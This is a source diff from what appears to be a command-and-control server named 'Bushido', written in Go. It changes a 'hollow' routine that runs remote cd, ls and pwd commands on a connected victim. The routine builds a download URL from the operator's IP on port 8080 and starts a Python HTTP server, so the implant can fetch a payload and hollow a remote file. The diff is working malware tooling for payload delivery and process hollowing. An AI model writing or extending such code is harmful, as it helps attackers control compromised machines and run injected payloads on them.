@@ -6,6 +6,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"strings"
 	"time"
 )
 
@@ -139,7 +140,7 @@ func ls(conn *net.Conn) {
 	fmt.Println(reply)
 }
 
-func cd(conn *net.Conn, dir2go string) {
+func cd(conn *net.Conn, dir2go string) { //Test this since I think cd .. is not working
 	(*conn).Write([]byte("cd\n"))
 	(*conn).Write([]byte("cd " + dir2go))
 }
@@ -165,7 +166,7 @@ func pwd(conn *net.Conn) {
 }
 
 func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
-	_, err := os.Stat(filePathLocal)
+	file, err := os.Stat(filePathLocal)
 	if err != nil {
 		fmt.Println("[-]Couldn't read the file on the local machine !")
 		return
@@ -208,18 +209,43 @@ func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 		return
 	}
 	fmt.Println("[+]The Remote File Exists !")
-	cmd := exec.Command("./scripts/pythonServer.sh")
-	cmd.Run()
-	fmt.Println("[*]Started python HTTP Server in Bushido dir")
-	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the file !")
-	fmt.Println("[*]Waiting for hollowing to finish ...")
+	//Send the entire URL instead
+	fileName := file.Name()
+	//Will pass a custom URL input by the user instead later
+	localAddress := (*conn).LocalAddr().String()
+	localIP := strings.Split(localAddress, ":")[0]
+	//Since we hard coded it to be 8080 the port we listen on we do the folowing
+	downloadURL := "http://" + localIP + ":8080/" + fileName
+	(*conn).Write([]byte(downloadURL))
 	read_len, err = (*conn).Read(buffer)
 	if err != nil {
-		fmt.Println("Error Reading From Buffer")
+		fmt.Println("[-]Error Reading From Buffer")
 		return
 	}
 	if read_len <= 1 {
-		fmt.Println("Error with length of buffer")
+		fmt.Println("[-]Error with length of buffer")
+		return
+	}
+	bufferSnapped = buffer[:read_len]
+	bufferStr = string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]URL did not send")
+		return
+	}
+	//Improve this just by sending the whole download URL instead and doing this shit server side
+	fmt.Println("[+]Download URL sent successfully !")
+	fmt.Println("[*]Started python HTTP Server in Bushido dir")
+	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the file !")
+	fmt.Println("[*]Waiting for hollowing to finish ...")
+	cmd := exec.Command("./scripts/pythonServer.sh")
+	cmd.Run()
+	read_len, err = (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of buffer")
 		return
 	}
 	//(*conn).SetReadDeadline(10 * time.Second)
